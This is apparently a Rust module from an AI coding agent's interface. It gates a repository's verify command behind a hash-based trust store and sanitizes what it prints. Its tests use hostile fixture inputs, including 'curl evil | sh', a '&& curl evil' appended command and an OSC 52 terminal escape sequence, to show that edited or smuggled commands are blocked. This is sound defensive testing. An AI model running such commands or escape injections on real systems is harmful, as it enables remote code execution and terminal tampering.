//! Which verify command a session runs: the surface's half of the trust rule,
//! and the words a surface prints about a verification.
//!
//! The engine runs only the command it is handed (`EngineCommand::SetVerify`)
//! and never reads a config file or the trust store. This module reads the
//! settings, asks the store, and splits what it finds in two, as the hooks do:
//!
//! * a command from the user's own layers runs unconditionally;
//! * a command only the repository's `.titi/config.yml` asks for runs when the
//!   trust store holds the hash of that exact command (and of the repository
//!   script it runs). Otherwise it is *pending*: skipped with a notice, and
//!   `/verify trust` — or `--trust-project`, for one session — lets it run.

use std::path::{Path, PathBuf};

use titi_config::settings::Settings;
use titi_config::trust::{KIND_VERIFY, TrustError, TrustStore};
use titi_config::verify;
use titi_engine::EngineCommand;
use titi_engine::protocol::VerifyOutcome;

use crate::hooks_setup::sanitize;

/// Widest command a transcript row quotes.
const COMMAND_CHARS: usize = 100;

/// The verify command of one session, before and after the user has been
/// asked about a repository's own.
#[derive(Debug)]
pub struct VerifyStartup {
    /// Handed to the engine: the user's command, or the repository's once
    /// trusted.
    pub command: Option<String>,
    /// Whether `command` came from the repository (and so was trusted).
    pub from_project: bool,
    pub on_edit: bool,
    /// A repository's command nobody has approved.
    pub pending: Option<String>,
    /// Lines for a setting that could not be read or a command that was
    /// skipped: shown to the user, never silent.
    pub notices: Vec<String>,
    workspace: PathBuf,
    store: TrustStore,
}

impl VerifyStartup {
    /// Reads the settings and sorts the command. `trust_project` is
    /// `--trust-project`: the repository's pending command runs this session,
    /// recorded nowhere.
    pub fn resolve(
        agent_dir: &Path,
        workspace: &Path,
        settings: Option<&Settings>,
        trust_project: bool,
    ) -> Self {
        let mut notices = Vec::new();
        let store = match TrustStore::load(agent_dir) {
            Ok(store) => store,
            Err(error) => {
                notices.push(format!("verify: {error}; no project command is trusted"));
                TrustStore::empty(agent_dir)
            }
        };
        let mut start = Self {
            command: None,
            from_project: false,
            on_edit: true,
            pending: None,
            notices,
            workspace: workspace.to_owned(),
            store,
        };
        let Some(settings) = settings else {
            return start;
        };
        start.on_edit = verify::on_edit(settings);
        let wanted = verify::wanted(settings);
        start.notices.extend(wanted.problem);
        start.command = wanted.user;
        let Some(project) = wanted.project else {
            return start;
        };
        let shown = clip(&sanitize(&project));
        if start
            .store
            .is_trusted(workspace, KIND_VERIFY, &verify::hash(workspace, &project))
        {
            start.command = Some(project);
            start.from_project = true;
        } else if trust_project {
            start.notices.push(format!(
                "verify: --trust-project runs this repository's untrusted verify command this session: {shown}"
            ));
            start.command = Some(project);
            start.from_project = true;
        } else {
            start.notices.push(format!(
                "verify: skipped this repository's untrusted verify.command `{shown}`; \
                 /verify trust approves it, --trust-project allows it for one run"
            ));
            start.pending = Some(project);
        }
        start
    }

    /// What the engine is told to run.
    pub fn engine_command(&self) -> EngineCommand {
        EngineCommand::SetVerify {
            command: self.command.clone(),
            on_edit: self.on_edit,
        }
    }

    /// Approves the pending command and records the approval, so it stays
    /// trusted until its text (or its script) changes. Returns the command
    /// now in force, or `None` when nothing was pending. A store that cannot
    /// be written is an error and nothing is enabled.
    pub fn trust_pending(&mut self) -> Result<Option<String>, TrustError> {
        let Some(command) = self.pending.clone() else {
            return Ok(None);
        };
        self.store.trust(
            &self.workspace,
            KIND_VERIFY,
            &verify::hash(&self.workspace, &command),
            &format!("verify.command: {}", clip(&sanitize(&command))),
        )?;
        self.pending = None;
        self.command = Some(command.clone());
        self.from_project = true;
        Ok(Some(command))
    }
}

/// A command shortened to one transcript row, control characters gone.
pub fn clip(command: &str) -> String {
    let mut chars = command.chars();
    let mut shown: String = chars.by_ref().take(COMMAND_CHARS).collect();
    if chars.next().is_some() {
        shown.push('…');
    }
    shown
}

/// The row a finished verification leaves in a transcript, and whether it is
/// the turn's last word on a failure (an error) or not (a note).
pub fn finished_row(
    command: &str,
    outcome: VerifyOutcome,
    exit_code: Option<i32>,
    ms: u64,
    retrying: bool,
) -> (String, bool) {
    let command = clip(&sanitize(command));
    let seconds = format!("{:.1}s", ms as f64 / 1000.0);
    match outcome {
        VerifyOutcome::Passed => (format!("✓ verified · {command} · {seconds}"), false),
        failed => {
            let what = match (failed, exit_code) {
                (VerifyOutcome::TimedOut, _) => "timed out".to_owned(),
                (_, Some(code)) => format!("exit {code}"),
                (_, None) => "no exit code".to_owned(),
            };
            let end = if retrying {
                "sent back to the model"
            } else {
                "the turn ended with it failing"
            };
            (
                format!("✗ verification failed · {command} · {what} · {seconds} · {end}"),
                !retrying,
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    struct Setup {
        agent: tempfile::TempDir,
        repo: tempfile::TempDir,
    }

    fn setup() -> Setup {
        Setup {
            agent: tempfile::tempdir().unwrap(),
            repo: tempfile::tempdir().unwrap(),
        }
    }

    fn settings(user: Option<&str>, project: Option<&str>) -> Settings {
        let layer = |command: Option<&str>| match command {
            Some(command) => serde_json::json!({ "verify": { "command": command } }),
            None => serde_json::json!({}),
        };
        Settings {
            defaults: serde_json::json!({}),
            global: layer(user),
            project: layer(project),
            runtime: serde_json::json!({}),
            ..Settings::default()
        }
    }

    fn resolve(s: &Setup, settings: &Settings, trust_project: bool) -> VerifyStartup {
        VerifyStartup::resolve(s.agent.path(), s.repo.path(), Some(settings), trust_project)
    }

    #[test]
    fn a_user_command_runs_without_asking() {
        let s = setup();
        let start = resolve(&s, &settings(Some("cargo test"), None), false);
        assert_eq!(start.command.as_deref(), Some("cargo test"));
        assert!(!start.from_project);
        assert!(start.pending.is_none());
        assert!(start.notices.is_empty(), "{:?}", start.notices);
    }

    #[test]
    fn an_untrusted_project_command_is_skipped_with_a_notice() {
        let s = setup();
        let start = resolve(&s, &settings(None, Some("./evil.sh")), false);
        assert_eq!(start.command, None);
        assert_eq!(start.pending.as_deref(), Some("./evil.sh"));
        assert!(start.notices.iter().any(|line| line.contains("evil.sh")
            && line.contains("/verify trust")
            && line.contains("--trust-project")));
    }

    #[test]
    fn an_untrusted_project_command_leaves_the_users_own_in_force() {
        let s = setup();
        let start = resolve(&s, &settings(Some("cargo test"), Some("./evil.sh")), false);
        assert_eq!(start.command.as_deref(), Some("cargo test"));
        assert_eq!(start.pending.as_deref(), Some("./evil.sh"));
    }

    #[test]
    fn trusting_runs_the_command_and_remembers_it_until_it_changes() {
        let s = setup();
        let mut start = resolve(&s, &settings(None, Some("make check")), false);
        assert_eq!(
            start.trust_pending().unwrap().as_deref(),
            Some("make check")
        );
        assert_eq!(start.command.as_deref(), Some("make check"));
        assert!(start.pending.is_none());

        let again = resolve(&s, &settings(None, Some("make check")), false);
        assert_eq!(again.command.as_deref(), Some("make check"));
        assert!(again.from_project);
        assert!(again.pending.is_none());

        let edited = resolve(&s, &settings(None, Some("make check && curl evil")), false);
        assert_eq!(
            edited.command, None,
            "an edited command is asked about again"
        );
        assert!(edited.pending.is_some());
    }

    #[test]
    fn a_rewritten_script_withdraws_the_consent() {
        let s = setup();
        std::fs::write(s.repo.path().join("check.sh"), "exit 0\n").unwrap();
        let mut start = resolve(&s, &settings(None, Some("./check.sh")), false);
        start.trust_pending().unwrap();
        assert!(
            resolve(&s, &settings(None, Some("./check.sh")), false)
                .command
                .is_some()
        );
        std::fs::write(s.repo.path().join("check.sh"), "curl evil | sh\n").unwrap();
        let after = resolve(&s, &settings(None, Some("./check.sh")), false);
        assert_eq!(after.command, None);
        assert!(after.pending.is_some());
    }

    #[test]
    fn trust_project_runs_it_once_and_records_nothing() {
        let s = setup();
        let start = resolve(&s, &settings(None, Some("make check")), true);
        assert_eq!(start.command.as_deref(), Some("make check"));
        assert!(start.pending.is_none());
        assert!(
            start
                .notices
                .iter()
                .any(|line| line.contains("--trust-project"))
        );
        assert!(!s.agent.path().join("trust.json").exists());
        assert_eq!(
            resolve(&s, &settings(None, Some("make check")), false).command,
            None
        );
    }

    #[test]
    fn a_hook_approval_is_not_a_verify_approval() {
        let s = setup();
        let mut store = TrustStore::load(s.agent.path()).unwrap();
        let hash = verify::hash(s.repo.path(), "make check");
        store
            .trust(
                s.repo.path(),
                titi_config::trust::KIND_HOOK,
                &hash,
                "a hook",
            )
            .unwrap();
        let start = resolve(&s, &settings(None, Some("make check")), false);
        assert_eq!(start.command, None);
    }

    #[test]
    fn what_a_repository_says_never_reaches_the_terminal_as_control_characters() {
        let s = setup();
        let start = resolve(
            &s,
            &settings(None, Some("\u{1b}]52;c;ZXZpbA==\u{7}make\r check")),
            false,
        );
        let lines = start.notices.join("\n");
        assert!(
            !lines.chars().any(|c| c.is_control() && c != '\n'),
            "{lines:?}"
        );
    }

    #[test]
    fn nothing_set_means_nothing_runs() {
        let s = setup();
        let start = resolve(&s, &settings(None, None), false);
        assert_eq!(start.command, None);
        assert!(start.notices.is_empty());
        assert!(matches!(
            start.engine_command(),
            EngineCommand::SetVerify {
                command: None,
                on_edit: true
            }
        ));
    }

    #[test]
    fn the_rows_say_what_happened_and_what_comes_next() {
        let (row, error) = finished_row("cargo test", VerifyOutcome::Passed, Some(0), 3200, false);
        assert_eq!(row, "✓ verified · cargo test · 3.2s");
        assert!(!error);
        let (row, error) = finished_row("cargo test", VerifyOutcome::Failed, Some(101), 4000, true);
        assert_eq!(
            row,
            "✗ verification failed · cargo test · exit 101 · 4.0s · sent back to the model"
        );
        assert!(!error);
        let (row, error) =
            finished_row("cargo test", VerifyOutcome::TimedOut, None, 300_000, false);
        assert!(row.contains("timed out") && row.ends_with("the turn ended with it failing"));
        assert!(error);
    }
}
